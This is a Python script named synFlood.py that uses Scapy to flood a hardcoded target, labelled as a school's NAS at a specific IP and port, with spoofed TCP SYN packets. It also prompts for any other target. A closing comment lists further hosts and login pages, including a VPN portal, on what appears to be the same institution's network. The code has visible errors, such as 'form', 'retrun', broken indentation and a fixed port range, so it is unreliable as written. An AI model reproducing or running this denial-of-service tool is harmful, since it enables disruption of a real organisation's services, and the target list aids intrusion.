"""
 * Program Name: synFlood.py
 * Subject: "chjhs NAS (210.243.21.166:5000)".
 * Input: Null
 * Output: Null
 * Since: 2021/12/14
 * ToolKit: python 3.9
 * Author: Finley
"""
form scapy.all import *
import random
#---
def synFlood_1():
    for i in range(10000):
    # 建構隨機的來源IP
    src = '%i.%i.%i.%i'%(
        random.randint(1, 255),
        random.randint(1, 255),
        random.randint(1, 255),
        random.randint(1, 255)
    )
    
    # 建構隨機的端口
    sport = random.randint(1024, 65535)
    IPlayer = IP(src=src, dst='210.243.21.166')
    TCPlayer = TCP(sport=sport, dport=5000, flags="s")
    packet = IPlayer/TCPlayer
    send(packet)
#---
# 生成隨機的IP
def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for i in range(4))))
    retrun ip

# 生成隨機的端口
def randomPort():
    port = random.randint(1000, 1000)
    return port

# syn-flood
def synFlood_2(cont, dstIP, dstPort):
    total = 0
    print("Packets are sending ...")
    for i in range(cont):
        # IPlayer
        srcIP = randomIP()
        dstIP = dstIP
        IPlayer = IP(src=srcIP, dst=dstIP)
        #TCPlayer
        srcPort = randomPort()
        TCPlayer = TCP(sport=srcPort, dport=dstPort, flags="s")
        #發送封包
        packet = IPlayer/TCPlayer
        send(packet)
        total+=1
    print("Total packets set: %i" % total)

# 顯示的訊息
def info():
    print("#"*30)
    print("# Welcome to SYN Flood Tool  #")
    print("#"*30)
    # 輸入目標IP和端口
    dstIP = input("Target IP : ")
    dstPort = int(input("Target Port : "))
    return dstIP, dstPort


if __name__ == '__main__':
    #---
    synFlood_1()
    #---
    dstIP, dstPort = info()
    count = int(input("Please input the number of packets : "))
    synFlood_2(count, dstIP, dstPort)

"""
https://www.chjhs.tp.edu.tw/dispLogin/login.aspx
https://www.chjhs.tp.edu.tw/dispPageBox/MainFull.aspx?ddsPageID=MAINHPRPAR
http://210.243.21.166:5000/
http://210.243.21.234/
https://210.243.21.253/global-protect/login.esp
http://210.243.21.88/index/index.php
http://210.243.21.89/
http://210.243.21.92/
https://210.243.21.4/en/
"""